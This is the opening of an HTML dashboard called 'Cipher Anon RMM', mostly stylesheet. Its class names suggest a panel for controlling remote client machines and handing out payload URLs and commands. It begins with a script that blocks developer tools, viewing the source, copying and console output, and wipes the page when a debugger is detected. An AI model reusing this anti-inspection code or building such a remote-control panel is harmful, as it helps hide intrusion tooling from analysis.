<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cipher Anon RMM</title>

    <script>
        (function() {
            document.addEventListener('keydown', function(e) {
                if (e.key === 'F12') { e.preventDefault(); return false; }
                if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) { e.preventDefault(); return false; }
                if (e.ctrlKey && e.shiftKey && (e.key === 'j' || e.key === 'J')) { e.preventDefault(); return false; }
                if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) { e.preventDefault(); return false; }
            }, true);
            document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; }, true);
            document.onselectstart = function() { return false; };
            document.oncopy = function() { return false; };
            console.log = function() {};
            console.warn = function() {};
            console.error = function() {};
            console.clear();

            function blockDevtools() {
                try {
                    const start = performance.now();
                    debugger;
                    const end = performance.now();
                    if (end - start > 100) {
                        document.body.innerHTML = '<div style="background:#0a0a0a;color:#ff4444;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;font-size:24px;">🔒 Access Denied</div>';
                        window.location.reload();
                    }
                } catch {}
            }
            setInterval(blockDevtools, 1000);
        })();
    </script>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #2a3a5a; border-radius: 2px; }

        body {
            background: #0a0e1a;
            color: #e2e8f0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            user-select: none;
            -webkit-user-select: none;
        }

        .sidebar {
            width: 260px;
            background: rgba(15, 22, 38, 0.95);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-right: 1px solid rgba(255,255,255,0.04);
            min-height: 100vh;
            padding: 20px 14px;
            flex-shrink: 0;
            position: sticky;
            top: 0;
            height: 100vh;
            overflow-y: auto;
            transition: transform 0.35s cubic-bezier(0.4, 0, 0.2, 1);
            z-index: 100;
            display: flex;
            flex-direction: column;
        }

        .sidebar .logo {
            padding: 0 6px 18px 6px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            margin-bottom: 18px;
        }
        .sidebar .logo .brand {
            font-size: 18px;
            font-weight: 700;
            color: #00ff88;
            display: flex;
            align-items: center;
            gap: 10px;
            letter-spacing: -0.3px;
        }
        .sidebar .logo .brand .icon { font-size: 22px; }
        .sidebar .logo .brand .highlight { color: #f43f5e; }
        .sidebar .logo .sub {
            font-size: 9px;
            color: #475569;
            letter-spacing: 2px;
            text-transform: uppercase;
            margin-top: 2px;
            padding-left: 4px;
        }
        .sidebar .logo .sub span { color: #00ff88; }

        .sidebar .nav-section {
            font-size: 9px;
            color: #334155;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            padding: 12px 8px 6px 8px;
            font-weight: 600;
        }

        .sidebar .nav-item {
            padding: 7px 12px;
            border-radius: 8px;
            color: #64748b;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-bottom: 1px;
            font-size: 12.5px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 500;
            position: relative;
        }
        .sidebar .nav-item:hover { background: rgba(255,255,255,0.04); color: #e2e8f0; }
        .sidebar .nav-item.active {
            background: rgba(0, 255, 136, 0.08);
            color: #00ff88;
            border-left: 2px solid #00ff88;
        }
        .sidebar .nav-item .icon { font-size: 15px; width: 20px; text-align: center; flex-shrink: 0; }
        .sidebar .nav-item .badge {
            margin-left: auto;
            background: rgba(0, 255, 136, 0.15);
            color: #00ff88;
            font-size: 9px;
            padding: 1px 8px;
            border-radius: 12px;
            font-weight: 600;
        }
        .sidebar .nav-item .badge.danger { background: rgba(244, 63, 94, 0.2); color: #f43f5e; }
        .sidebar .nav-item .badge.warning { background: rgba(251, 191, 36, 0.2); color: #fbbf24; }

        .sidebar .nav-divider {
            border-top: 1px solid rgba(255,255,255,0.04);
            margin: 10px 8px;
        }

        .sidebar .contact-support {
            margin-top: auto;
            padding: 8px 12px;
            border-radius: 8px;
            background: rgba(0, 136, 204, 0.08);
            border: 1px solid rgba(0, 136, 204, 0.15);
            color: #00aaff;
            cursor: pointer;
            transition: all 0.2s ease;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 500;
            text-decoration: none;
        }
        .sidebar .contact-support:hover {
            background: rgba(0, 136, 204, 0.15);
            border-color: rgba(0, 136, 204, 0.3);
            transform: scale(1.02);
        }

        .sidebar .version {
            font-size: 9px;
            color: #1e293b;
            text-align: center;
            margin-top: 12px;
            padding-top: 10px;
            border-top: 1px solid rgba(255,255,255,0.04);
        }
        .sidebar .version span { color: #00ff88; }

        .sidebar-toggle {
            display: none;
            position: fixed;
            top: 12px;
            left: 12px;
            z-index: 200;
            background: rgba(15, 22, 38, 0.9);
            backdrop-filter: blur(8px);
            border: 1px solid rgba(255,255,255,0.06);
            color: #94a3b8;
            padding: 6px 10px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            transition: 0.2s;
        }
        .sidebar-toggle:hover { border-color: rgba(255,255,255,0.15); color: #e2e8f0; }

        .sidebar-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(4px);
            z-index: 50;
        }

        .main {
            flex: 1;
            padding: 20px 28px 28px;
            min-height: 100vh;
            max-width: 100%;
            overflow-x: hidden;
            transition: margin-right 0.35s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .main.shifted { margin-right: 420px; }

        .topbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 14px;
            border-bottom: 1px solid rgba(255,255,255,0.04);
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 12px;
        }
        .topbar .left h1 {
            font-size: 22px;
            font-weight: 700;
            color: #f1f5f9;
            letter-spacing: -0.4px;
        }
        .topbar .left p {
            font-size: 13px;
            color: #64748b;
            margin-top: 2px;
        }
        .topbar .left p .accent { color: #00ff88; }

        .topbar .right {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .topbar .right .live-badge {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 12px;
            color: #64748b;
            background: rgba(255,255,255,0.04);
            padding: 4px 12px;
            border-radius: 20px;
            border: 1px solid rgba(255,255,255,0.04);
        }
        .topbar .right .live-badge .dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #00ff88;
            animation: pulse-dot 1.5s infinite;
        }
        @keyframes pulse-dot { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.8); } }

        .topbar .right .user {
            display: flex;
            align-items: center;
            gap: 8px;
            background: rgba(255,255,255,0.04);
            padding: 4px 12px 4px 6px;
            border-radius: 20px;
            border: 1px solid rgba(255,255,255,0.04);
            font-size: 12px;
            color: #e2e8f0;
        }
        .topbar .right .user .avatar {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            background: linear-gradient(135deg, #00ff88, #00cc77);
            color: #0a0e1a;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 12px;
        }
        .topbar .right .icon-btn {
            background: transparent;
            border: 1px solid rgba(255,255,255,0.04);
            color: #64748b;
            padding: 6px 10px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            transition: 0.2s;
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .topbar .right .icon-btn:hover { border-color: rgba(255,255,255,0.12); color: #e2e8f0; }
        .topbar .right .icon-btn.danger { border-color: rgba(244, 63, 94, 0.2); color: #f43f5e; }
        .topbar .right .icon-btn.danger:hover { background: rgba(244, 63, 94, 0.1); }

        .stats-row {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 12px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: rgba(255,255,255,0.02);
            border: 1px solid rgba(255,255,255,0.04);
            border-radius: 12px;
            padding: 14px 16px;
            transition: all 0.3s ease;
        }
        .stat-card:hover { border-color: rgba(255,255,255,0.08); transform: translateY(-2px); }
        .stat-card .label { font-size: 10px; color: #475569; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
        .stat-card .number { font-size: 26px; font-weight: 700; margin-top: 2px; letter-spacing: -0.3px; }
        .stat-card .number.green { color: #00ff88; }
        .stat-card .number.gold { color: #fbbf24; }
        .stat-card .number.red { color: #f43f5e; }
        .stat-card .number.purple { color: #8b5cf6; }
        .stat-card .number.blue { color: #3b82f6; }
        .stat-card .sub { font-size: 10px; color: #334155; margin-top: 2px; }

        .filter-bar {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 18px;
            background: rgba(255,255,255,0.02);
            border: 1px solid rgba(255,255,255,0.04);
            border-radius: 12px;
            padding: 12px 16px;
            align-items: center;
        }
        .filter-bar .filter-group {
            display: flex;
            align-items: center;
            gap: 6px;
            flex-wrap: wrap;
        }
        .filter-bar .filter-group label {
            font-size: 10px;
            color: #475569;
            text-transform: uppercase;
            letter-spacing: 0.4px;
            font-weight: 600;
        }
        .filter-bar .filter-group input,
        .filter-bar .filter-group select {
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 6px;
            padding: 5px 10px;
            color: #e2e8f0;
            font-size: 12px;
            font-family: inherit;
            outline: none;
            transition: 0.2s;
            min-width: 120px;
        }
        .filter-bar .filter-group input:focus,
        .filter-bar .filter-group select:focus {
            border-color: #00ff88;
            background: rgba(0, 255, 136, 0.04);
        }
        .filter-bar .filter-group input::placeholder { color: #334155; }
        .filter-bar .filter-group select option { background: #0f1626; }

        .filter-bar .btn-filter {
            padding: 5px 14px;
            border-radius: 6px;
            border: 1px solid rgba(255,255,255,0.06);
            background: rgba(255,255,255,0.04);
            color: #94a3b8;
            cursor: pointer;
            font-size: 11px;
            transition: 0.2s;
            font-family: inherit;
            font-weight: 500;
        }
        .filter-bar .btn-filter:hover { border-color: rgba(255,255,255,0.12); color: #e2e8f0; }
        .filter-bar .btn-filter.primary { border-color: #00ff88; color: #00ff88; }
        .filter-bar .btn-filter.primary:hover { background: rgba(0, 255, 136, 0.08); }

        .clients-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
            gap: 14px;
            margin-top: 4px;
        }

        .client-card {
            background: rgba(255,255,255,0.02);
            border: 1px solid rgba(255,255,255,0.04);
            border-radius: 14px;
            padding: 16px 18px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            cursor: pointer;
        }
        .client-card:hover {
            border-color: rgba(255,255,255,0.08);
            transform: translateY(-3px);
            box-shadow: 0 12px 40px rgba(0,0,0,0.3);
        }
        .client-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00ff88, transparent);
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        .client-card:hover::before { opacity: 1; }

        .client-card .card-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 6px;
        }
        .client-card .card-header .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            flex-shrink: 0;
        }
        .client-card .card-header .status-dot.online {
            background: #00ff88;
            box-shadow: 0 0 16px rgba(0, 255, 136, 0.3);
        }
        .client-card .card-header .status-dot.offline {
            background: #f43f5e;
            box-shadow: 0 0 16px rgba(244, 63, 94, 0.2);
        }
        .client-card .card-header .pc-name {
            font-size: 15px;
            font-weight: 600;
            color: #f1f5f9;
        }
        .client-card .card-header .status-text {
            font-size: 10px;
            font-weight: 500;
            padding: 2px 10px;
            border-radius: 12px;
        }
        .client-card .card-header .status-text.online {
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
        }
        .client-card .card-header .status-text.offline {
            background: rgba(244, 63, 94, 0.1);
            color: #f43f5e;
        }
        .client-card .card-header .time-ago {
            margin-left: auto;
            font-size: 10px;
            color: #475569;
        }

        .client-card .card-body {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            font-size: 11px;
            color: #94a3b8;
            margin-top: 4px;
        }
        .client-card .card-body .flag { font-size: 16px; }
        .client-card .card-body .ip { font-family: monospace; color: #e2e8f0; }
        .client-card .card-body .rmm-type {
            background: rgba(139, 92, 246, 0.1);
            color: #8b5cf6;
            padding: 1px 8px;
            border-radius: 10px;
            font-size: 9px;
            font-weight: 600;
        }
        .client-card .card-body .client-id {
            font-size: 9px;
            color: #334155;
            font-family: monospace;
        }

        .client-card .card-actions {
            display: flex;
            flex-wrap: wrap;
            gap: 4px;
            margin-top: 12px;
            padding-top: 12px;
            border-top: 1px solid rgba(255,255,255,0.04);
        }
        .client-card .card-actions .btn-sm {
            padding: 3px 10px;
            font-size: 9px;
            border-radius: 6px;
            border: 1px solid rgba(255,255,255,0.06);
            background: transparent;
            color: #64748b;
            cursor: pointer;
            transition: all 0.2s ease;
            font-weight: 500;
            font-family: inherit;
            display: inline-flex;
            align-items: center;
            gap: 3px;
        }
        .client-card .card-actions .btn-sm:hover {
            border-color: rgba(255,255,255,0.12);
            color: #e2e8f0;
        }
        .client-card .card-actions .btn-sm.primary { border-color: #00ff88; color: #00ff88; }
        .client-card .card-actions .btn-sm.primary:hover { background: rgba(0, 255, 136, 0.08); }
        .client-card .card-actions .btn-sm.gold { border-color: #fbbf24; color: #fbbf24; }
        .client-card .card-actions .btn-sm.gold:hover { background: rgba(251, 191, 36, 0.08); }
        .client-card .card-actions .btn-sm.violet { border-color: #8b5cf6; color: #8b5cf6; }
        .client-card .card-actions .btn-sm.violet:hover { background: rgba(139, 92, 246, 0.08); }
        .client-card .card-actions .btn-sm.blue { border-color: #3b82f6; color: #3b82f6; }
        .client-card .card-actions .btn-sm.blue:hover { background: rgba(59, 130, 246, 0.08); }
        .client-card .card-actions .btn-sm.danger { border-color: #f43f5e; color: #f43f5e; }
        .client-card .card-actions .btn-sm.danger:hover { background: rgba(244, 63, 94, 0.08); }
        .client-card .card-actions .btn-sm .icon { font-size: 10px; }

        .payload-box {
            background: rgba(255,255,255,0.02);
            border: 1px solid rgba(255,255,255,0.04);
            border-radius: 14px;
            padding: 24px 28px;
            max-width: 800px;
            margin: 0 auto;
        }
        .payload-box .payload-title {
            font-size: 18px;
            font-weight: 700;
            color: #f1f5f9;
            margin-bottom: 6px;
        }
        .payload-box .payload-desc {
            font-size: 13px;
            color: #64748b;
            margin-bottom: 20px;
        }
        .payload-box .payload-url {
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 8px;
            padding: 10px 14px;
            font-family: 'Cascadia Code', 'Consolas', monospace;
            font-size: 13px;
            color: #00ff88;
            word-break: break-all;
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 12px;
        }
        .payload-box .payload-url .url-text { flex: 1; min-width: 100px; word-break: break-all; }
        .payload-box .payload-command {
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 8px;
            padding: 10px 14px;
            font-family: 'Cascadia Code', 'Consolas', monospace;
            font-size: 12px;
            color: #f1f5f9;
            word-break: break-all;
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 16px;
        }
        .payload-box .payload-command .cmd-text { flex: 1; min-width: 100px; word-break: break-all; }
        .payload-box .payload-actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        .payload-box .payload-actions .btn {
            padding: 6px 16px;
            border-radius: 8px;
            border: 1px solid rgba(255,255,255,0.06);
            background: transparent;
            color: #94a3b8;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.25s ease;
            font-weight: 500;
            font-family: inherit;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .payload-box .payload-actions .btn:hover { border-color: rgba(255,255,255,0.12); color: #e2e8f0; }
        .payload-box .payload-actions .btn.primary { border-color: #00ff88; color: #00ff88; }
        .payload-box .payload-actions .btn.primary:hover { background: rgba(0, 255, 136, 0.08); }
        .payload-box .payload-actions .btn.gold { border-color: #fbbf24; color: #fbbf24; }
        .payload-box .payload-actions .btn.gold:hover { background: rgba(251, 191, 36, 0.08); }

        .empty-state {
            grid-column: 1/-1;
            text-align: center;
            padding: 60px 20px;
            color: #334155;
        }
        .empty-state .icon { font-size: 48px; margin-bottom: 12px; opacity: 0.4; }
        .empty-state h3 { color: #64748b; font-size: 17px; font-weight: 600; }
        .empty-state p { font-size: 13px; margin-top: 4px; }

        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(15, 22, 38, 0.95);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255,255,255,0.06);
            padding: 10px 18px;
            border-radius: 10px;
            color: #e2e8f0;
            font-size: 12px;
            opacity: 0;
            transform: translateY(16px) scale(0.95);
            transition: all 0.35s ease;
            z-index: 2000;
            max-width: 340px;
            box-shadow: 0 12px 40px rgba(0,0,0,0.5);
            font-weight: 500;
        }
        .toast.show { opacity: 1; transform: translateY(0) scale(1); }
        .toast.success { border-color: #00ff88; color: #00ff88; }
        .toast.error { border-color: #f43f5e; color: #f43f5e; }
        .toast.warning { border-color: #fbbf24; color: #fbbf24; }

        /* ---- MODERN GLASS MODAL ---- */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            z-index: 1000;
            padding: 20px;
            overflow-y: auto;
            align-items: center;
            justify-content: center;
        }
        .modal-overlay.active { display: flex; }

        .modal-box {
            background: rgba(15, 22, 38, 0.95);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            max-width: 480px;
            width: 100%;
            border-radius: 20px;
            padding: 32px 28px 28px;
            border: 1px solid rgba(255,255,255,0.06);
            box-shadow: 0 32px 80px rgba(0,0,0,0.6);
            animation: modalIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            position: relative;
            overflow: hidden;
        }
        .modal-box::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00ff88, transparent);
            opacity: 0.6;
        }
        @keyframes modalIn { 0% { opacity: 0; transform: scale(0.92) translateY(30px); } 100% { opacity: 1; transform: scale(1) translateY(0); } }

        .modal-box .modal-icon {
            font-size: 48px;
            text-align: center;
            margin-bottom: 12px;
        }
        .modal-box h2 {
            color: #f1f5f9;
            font-size: 20px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 6px;
        }
        .modal-box p {
            color: #94a3b8;
            font-size: 14px;
            text-align: center;
            line-height: 1.6;
            margin-bottom: 24px;
        }
        .modal-box .modal-actions {
            display: flex;
            gap: 10px;
        }
        .modal-box .modal-actions .btn {
            flex: 1;
            justify-content: center;
            padding: 10px 16px;
            font-size: 13px;
            border-radius: 10px;
            font-weight: 600;
            border: 1px solid rgba(255,255,255,0.06);
            background: transparent;
            color: #94a3b8;
            cursor: pointer;
            transition: all 0.25s ease;
            font-family: inherit;
        }
        .modal-box .modal-actions .btn:hover {
            border-color: rgba(255,255,255,0.12);
            color: #e2e8f0;
            transform: translateY(-1px);
        }
        .modal-box .modal-actions .btn.cancel {
            border-color: rgba(255,255,255,0.06);
            color: #94a3b8;
        }
        .modal-box .modal-actions .btn.cancel:hover {
            border-color: rgba(255,255,255,0.12);
            color: #e2e8f0;
            background: rgba(255,255,255,0.04);
        }
        .modal-box .modal-actions .btn.confirm {
            border-color: #00ff88;
            color: #00ff88;
        }
        .modal-box .modal-actions .btn.confirm:hover {
            background: rgba(0, 255, 136, 0.08);
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.05);
        }
        .modal-box .modal-actions .btn.danger {
            border-color: #f43f5e;
            color: #f43f5e;
        }
        .modal-box .modal-actions .btn.danger:hover {
            background: rgba(244, 63, 94, 0.08);
            box-shadow: 0 0 30px rgba(244, 63, 94, 0.05);
        }
        .modal-box .modal-actions .btn.violet {
            border-color: #8b5cf6;
            color: #8b5cf6;
        }
        .modal-box .modal-actions .btn.violet:hover {
            background: rgba(139, 92, 246, 0.08);
        }
        .modal-box .modal-actions .btn.gold {
            border-color: #fbbf24;
            color: #fbbf24;
        }
        .modal-box .modal-actions .btn.gold:hover {
            background: rgba(251, 191, 36, 0.08);
        }
        .modal-box .modal-actions .btn.blue {
            border-color: #3b82f6;
            color: #3b82f6;
        }
        .modal-box .modal-actions .btn.blue:hover {
            background: rgba(59, 130, 246, 0.08);
        }

        .modal-box .close-btn {
            position: absolute;
            top: 12px;
            right: 16px;
            background: none;
            border: none;
            color: #475569;
            font-size: 20px;
            cursor: pointer;
            transition: 0.2s;
            padding: 4px 8px;
            border-radius: 6px;
        }
        .modal-box .close-btn:hover { color: #e2e8f0; background: rgba(255,255,255,0.04); }

        .modal-box .form-group { margin-bottom: 14px; }
        .modal-box .form-group label { display: block; font-size: 11px; color: #94a3b8; margin-bottom: 3px; font-weight: 500; }
        .modal-box .form-group input {
            width: 100%;
            padding: 8px 12px;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 8px;
            color: #e2e8f0;
            font-size: 13px;
            transition: 0.2s;
            font-family: inherit;
            outline: none;
        }
        .modal-box .form-group input:focus { border-color: #00ff88; background: rgba(0, 255, 136, 0.04); }
        .modal-box .form-group input::placeholder { color: #334155; }
        .modal-box .form-group .error-text { font-size: 10px; color: #f43f5e; margin-top: 2px; display: none; }
        .modal-box .form-group .error-text.show { display: block; }
        .modal-box .form-group .help-text { font-size: 10px; color: #475569; margin-top: 2px; }
        .modal-box .form-group .help-text a { color: #00ff88; }

        .modal-box .info-text {
            font-size: 10px;
            color: #475569;
            text-align: center;
            margin-top: 14px;
            padding-top: 12px;
            border-top: 1px solid rgba(255,255,255,0.04);
        }
        .modal-box .info-text .key { color: #64748b; font-family: monospace; font-size: 9px; }

        .btn {
            padding: 6px 14px;
            border-radius: 8px;
            border: 1px solid rgba(255,255,255,0.06);
            background: rgba(255,255,255,0.02);
            color: #94a3b8;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.25s ease;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            font-weight: 500;
            white-space: nowrap;
            font-family: inherit;
        }
        .btn:hover { border-color: rgba(255,255,255,0.12); background: rgba(255,255,255,0.04); color: #e2e8f0; }
        .btn.primary { border-color: #00ff88; color: #00ff88; }
        .btn.primary:hover { background: rgba(0, 255, 136, 0.08); box-shadow: 0 0 30px rgba(0, 255, 136, 0.05); }
        .btn.danger { border-color: #f43f5e; color: #f43f5e; }
        .btn.danger:hover { background: rgba(244, 63, 94, 0.08); }
        .btn.violet { border-color: #8b5cf6; color: #8b5cf6; }
        .btn.violet:hover { background: rgba(139, 92, 246, 0.08); }
        .btn.gold { border-color: #fbbf24; color: #fbbf24; }
        .btn.gold:hover { background: rgba(251, 191, 36, 0.08); }
        .btn.blue { border-color: #3b82f6; color: #3b82f6; }
        .btn.blue:hover { background: rgba(59, 130, 246, 0.08); }

        .view-content { display: none; }
        .view-content.active { display: block; }

        .powered-footer {
            text-align: center;
            font-size: 10px;
            color: #1e293b;
            margin-top: 24px;
            padding-top: 14px;
            border-top: 1px solid rgba(255,255,255,0.04);
        }
        .powered-footer .name { color: #00ff88; font-weight: 600; }

        /* ---- SIDE PANEL ---- */
        .side-panel-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(4px);
            z-index: 150;
        }
        .side-panel-overlay.active { display: block; }

        .side-panel {
            position: fixed;
            top: 0;
            right: -440px;
            width: 420px;
            height: 100vh;
            background: rgba(15, 22, 38, 0.98);
            backdrop-filter: blur(20px);
            border-left: 1px solid rgba(255,255,255,0.04);
            z-index: 160;
            transition: right 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .side-panel.open { right: 0; }

        .side-panel .panel-header {
            padding: 18px 20px;
            border-bottom: 1px solid rgba(255,255,255,0.04);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
        }
        .side-panel .panel-header .panel-title {
            font-size: 16px;
            font-weight: 700;
            color: #f1f5f9;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .side-panel .panel-header .panel-title .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            display: inline-block;
        }
        .side-panel .panel-header .panel-title .status-dot.online { background: #00ff88; }
        .side-panel .panel-header .panel-title .status-dot.offline { background: #f43f5e; }
        .side-panel .panel-header .close-panel {
            background: none;
            border: none;
            color: #64748b;
            font-size: 22px;
            cursor: pointer;
            transition: 0.2s;
            padding: 4px 8px;
            border-radius: 6px;
        }
        .side-panel .panel-header .close-panel:hover { color: #e2e8f0; background: rgba(255,255,255,0.04); }

        .side-panel .panel-body {
            flex: 1;
            overflow-y: auto;
            padding: 16px 20px 20px;
        }

        .side-panel .panel-body .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px 16px;
            margin-bottom: 16px;
            padding: 12px 14px;
            background: rgba(255,255,255,0.02);
            border-radius: 10px;
            border: 1px solid rgba(255,255,255,0.04);
        }
        .side-panel .panel-body .info-grid .info-item { font-size: 12px; }
        .side-panel .panel-body .info-grid .info-item .label { color: #64748b; font-size: 9px; text-transform: uppercase; letter-spacing: 0.4px; }
        .side-panel .panel-body .info-grid .info-item .value { color: #e2e8f0; font-weight: 500; margin-top: 1px; }

        .side-panel .panel-body .section-title {
            font-size: 11px;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            font-weight: 600;
            margin: 14px 0 8px 0;
        }

        .side-panel .panel-body .panel-actions {
            display: flex;
            flex-wrap: wrap;
            gap: 4px;
            margin-bottom: 12px;
        }
        .side-panel .panel-body .panel-actions .btn-sm {
            padding: 4px 12px;
            font-size: 10px;
            border-radius: 6px;
            border: 1px solid rgba(255,255,255,0.06);
            background: transparent;
            color: #94a3b8;
            cursor: pointer;
            transition: all 0.2s ease;
            font-weight: 500;
            font-family: inherit;
            display: inline-flex;
            align-items: center;
            gap: 4px;
        }
        .side-panel .panel-body .panel-actions .btn-sm:hover {
            border-color: rgba(255,255,255,0.12);
            color: #e2e8f0;
        }
        .side-panel .panel-body .panel-actions .btn-sm.primary { border-color: #00ff88; color: #00ff88; }
        .side-panel .panel-body .panel-actions .btn-sm.primary:hover { background: rgba(0, 255, 136, 0.08); }
        .side-panel .panel-body .panel-actions .btn-sm.gold { border-color: #fbbf24; color: #fbbf24; }
        .side-panel .panel-body .panel-actions .btn-sm.gold:hover { background: rgba(251, 191, 36, 0.08); }
        .side-panel .panel-body .panel-actions .btn-sm.violet { border-color: #8b5cf6; color: #8b5cf6; }
        .side-panel .panel-body .panel-actions .btn-sm.violet:hover { background: rgba(139, 92, 246, 0.08); }
        .side-panel .panel-body .panel-actions .btn-sm.blue { border-color: #3b82f6; color: #3b82f6; }
        .side-panel .panel-body .panel-actions .btn-sm.blue:hover { background: rgba(59, 130, 246, 0.08); }
        .side-panel .panel-body .panel-actions .btn-sm.danger { border-color: #f43f5e; color: #f43f5e; }
        .side-panel .panel-body .panel-actions .btn-sm.danger:hover { background: rgba(244, 63, 94, 0.08); }
        .side-panel .panel-body .panel-actions .btn-sm .icon { font-size: 11px; }

        .side-panel .panel-body .screen-container {
            background: rgba(0,0,0,0.4);
            border: 1px solid rgba(255,255,255,0.04);
            border-radius: 10px;
            padding: 12px;
            margin-top: 4px;
            min-height: 120px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: #475569;
            font-size: 13px;
            position: relative;
        }
        .side-panel .panel-body .screen-container .screen-placeholder { text-align: center; }
        .side-panel .panel-body .screen-container .screen-placeholder .icon { font-size: 32px; margin-bottom: 8px; opacity: 0.3; }
        .side-panel .panel-body .screen-container .screen-placeholder .sub { font-size: 11px; color: #334155; }

        .side-panel .panel-body .terminal-container {
            background: rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.04);
            border-radius: 10px;
            overflow: hidden;
            margin-top: 4px;
        }
        .side-panel .panel-body .terminal-container .terminal-header {
            padding: 6px 12px;
            background: rgba(255,255,255,0.02);
            border-bottom: 1px solid rgba(255,255,255,0.04);
            font-size: 10px;
            color: #64748b;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.4px;
        }
        .side-panel .panel-body .terminal-container .terminal-header .term-dots span {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 4px;
        }
        .side-panel .panel-body .terminal-container .terminal-header .term-dots .red { background: #f43f5e; }
        .side-panel .panel-body .terminal-container .terminal-header .term-dots .yellow { background: #fbbf24; }
        .side-panel .panel-body .terminal-container .terminal-header .term-dots .green { background: #00ff88; }

        .side-panel .panel-body .terminal-container .terminal-output {
            padding: 8px 12px;
            max-height: 200px;
            overflow-y: auto;
            font-family: 'Cascadia Code', 'Consolas', monospace;
            font-size: 11px;
            color: #e2e8f0;
            min-height: 60px;
            background: rgba(0,0,0,0.2);
        }
        .side-panel .panel-body .terminal-container .terminal-output .term-line {
            padding: 1px 0;
            border-bottom: 1px solid rgba(255,255,255,0.02);
            word-break: break-all;
            white-space: pre-wrap;
        }
        .side-panel .panel-body .terminal-container .terminal-output .term-line .prompt { color: #00ff88; font-weight: 500; }
        .side-panel .panel-body .terminal-container .terminal-output .term-line .cmd { color: #f1f5f9; }
